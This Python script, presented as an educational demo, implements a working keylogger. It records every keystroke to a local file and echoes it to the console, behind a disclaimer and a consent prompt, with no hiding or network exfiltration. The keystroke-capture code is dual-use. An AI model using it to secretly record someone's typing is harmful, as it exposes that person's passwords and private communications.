#!/usr/bin/env python3
"""
Educational Keylogger Demo

A simple keylogger that captures keyboard events and logs them to a file.
FOR EDUCATIONAL PURPOSES ONLY - Use only on systems you own.

This tool demonstrates:
- Event handling and hooks
- Input capture mechanisms
- File I/O operations
- Understanding how malicious software works (to better defend against it)
"""

import os
import sys
from datetime import datetime

# Check for pynput, prompt installation if missing
try:
    from pynput import keyboard
except ImportError:
    print("[!] pynput library not found.")
    print("[!] Install it using: pip install pynput")
    sys.exit(1)


class EducationalKeylogger:
    """
    Educational keylogger demonstration class.
    
    WARNING: This is for educational purposes only.
    Unauthorized use is illegal and unethical.
    """
    
    def __init__(self, log_file="keylog.txt"):
        """
        Initialize the keylogger.
        
        Args:
            log_file (str): Path to the log file
        """
        self.log_file = log_file
        self.buffer = []
        # Create or clear the log file on start
        self._initialize_log_file()
        
    def _initialize_log_file(self):
        """Create or clear the log file and add a header."""
        try:
            with open(self.log_file, 'w', encoding='utf-8') as f:
                f.write("=" * 60 + "\n")
                f.write("EDUCATIONAL KEYLOGGER DEMO - LOG FILE\n")
                f.write(f"Session started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("=" * 60 + "\n\n")
            print(f"[+] Log file initialized: {self.log_file}")
        except PermissionError:
            print(f"[!] Permission denied: Cannot write to {self.log_file}")
            sys.exit(1)
    
    def _write_to_log(self, text):
        """
        Write text to the log file immediately.
        
        Args:
            text (str): Text to write
        """
        try:
            with open(self.log_file, 'a', encoding='utf-8') as f:
                f.write(text)
        except Exception as e:
            print(f"[!] Error writing to log: {e}")
    
    def on_press(self, key):
        """
        Callback function for key press events.
        
        Args:
            key: The key that was pressed
        """
        try:
            # Regular alphanumeric keys
            if hasattr(key, 'char') and key.char is not None:
                self._write_to_log(key.char)
                print(key.char, end='', flush=True)
            else:
                # Special keys
                special_key_map = {
                    keyboard.Key.space: ' ',
                    keyboard.Key.enter: '\n[ENTER]\n',
                    keyboard.Key.tab: '\t',
                    keyboard.Key.backspace: '[BACKSPACE]',
                    keyboard.Key.delete: '[DELETE]',
                    keyboard.Key.shift: '[SHIFT]',
                    keyboard.Key.shift_l: '[SHIFT_L]',
                    keyboard.Key.shift_r: '[SHIFT_R]',
                    keyboard.Key.ctrl_l: '[CTRL_L]',
                    keyboard.Key.ctrl_r: '[CTRL_R]',
                    keyboard.Key.alt_l: '[ALT_L]',
                    keyboard.Key.alt_r: '[ALT_R]',
                    keyboard.Key.cmd: '[CMD]',
                    keyboard.Key.esc: '[ESC]',
                    keyboard.Key.up: '[UP]',
                    keyboard.Key.down: '[DOWN]',
                    keyboard.Key.left: '[LEFT]',
                    keyboard.Key.right: '[RIGHT]',
                    keyboard.Key.home: '[HOME]',
                    keyboard.Key.end: '[END]',
                    keyboard.Key.page_up: '[PAGE_UP]',
                    keyboard.Key.page_down: '[PAGE_DOWN]',
                    keyboard.Key.f1: '[F1]',
                    keyboard.Key.f2: '[F2]',
                    keyboard.Key.f3: '[F3]',
                    keyboard.Key.f4: '[F4]',
                    keyboard.Key.f5: '[F5]',
                    keyboard.Key.f6: '[F6]',
                    keyboard.Key.f7: '[F7]',
                    keyboard.Key.f8: '[F8]',
                    keyboard.Key.f9: '[F9]',
                    keyboard.Key.f10: '[F10]',
                    keyboard.Key.f11: '[F11]',
                    keyboard.Key.f12: '[F12]',
                }
                
                mapped_key = special_key_map.get(key, f'[{str(key)}]')
                self._write_to_log(mapped_key)
                print(mapped_key, end='', flush=True)
                
        except Exception as e:
            print(f"[!] Error processing key: {e}")
    
    def on_release(self, key):
        """
        Callback function for key release events.
        Stops the listener if ESC is pressed.
        
        Args:
            key: The key that was released
            
        Returns:
            bool: False to stop listener on ESC, True otherwise
        """
        if key == keyboard.Key.esc:
            self._write_to_log(f"\n\n[SESSION ENDED] {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            print("\n\n[!] ESC pressed. Stopping keylogger...")
            return False
        return True
    
    def start(self):
        """
        Start the keylogger listener.
        """
        print("\n" + "=" * 60)
        print("EDUCATIONAL KEYLOGGER DEMO")
        print("=" * 60)
        print("\n⚠️  IMPORTANT DISCLAIMER:")
        print("   This tool is for EDUCATIONAL PURPOSES ONLY.")
        print("   Use only on systems you own or have explicit permission to test.")
        print("\n📋 Instructions:")
        print("   - Press any key to test the logger")
        print("   - Press ESC to stop the logger")
        print(f"   - Logs are saved to: {self.log_file}")
        print("\n" + "-" * 60)
        print("Starting keylogger capture... (Press ESC to stop)")
        print("-" * 60 + "\n")
        
        # Create and start the listener
        with keyboard.Listener(
            on_press=self.on_press,
            on_release=self.on_release
        ) as listener:
            listener.join()
        
        print(f"\n[+] Keylogger stopped. Log saved to {self.log_file}")


def main():
    """Main entry point with additional safety checks."""
    
    # Display banner with strong warning
    banner = """
    ╔══════════════════════════════════════════════════════════════╗
    ║                                                              ║
    ║              EDUCATIONAL KEYLOGGER DEMO v1.0                 ║
    ║                                                              ║
    ║   ⚠️  FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY  ⚠️         ║
    ║                                                              ║
    ║   Unauthorized use on systems you do not own is ILLEGAL      ║
    ║   and violates privacy laws and computer fraud statutes.     ║
    ║                                                              ║
    ╚══════════════════════════════════════════════════════════════╝
    """
    print(banner)
    
    # Verification prompt
    print("\nBy continuing, you confirm that:")
    print("  1. You are running this on a system you own")
    print("  2. You understand this is for educational purposes")
    print("  3. You will not use this tool illegally")
    
    confirm = input("\nDo you understand and agree? (yes/no): ").strip().lower()
    
    if confirm != 'yes':
        print("\n[!] Exiting. Use this tool responsibly.")
        sys.exit(0)
    
    # Ask for custom log file location
    log_path = input("\nEnter log file path (default: keylog.txt): ").strip()
    if not log_path:
        log_path = "keylog.txt"
    
    # Start the keylogger
    try:
        logger = EducationalKeylogger(log_file=log_path)
        logger.start()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user. Exiting.")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Unexpected error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
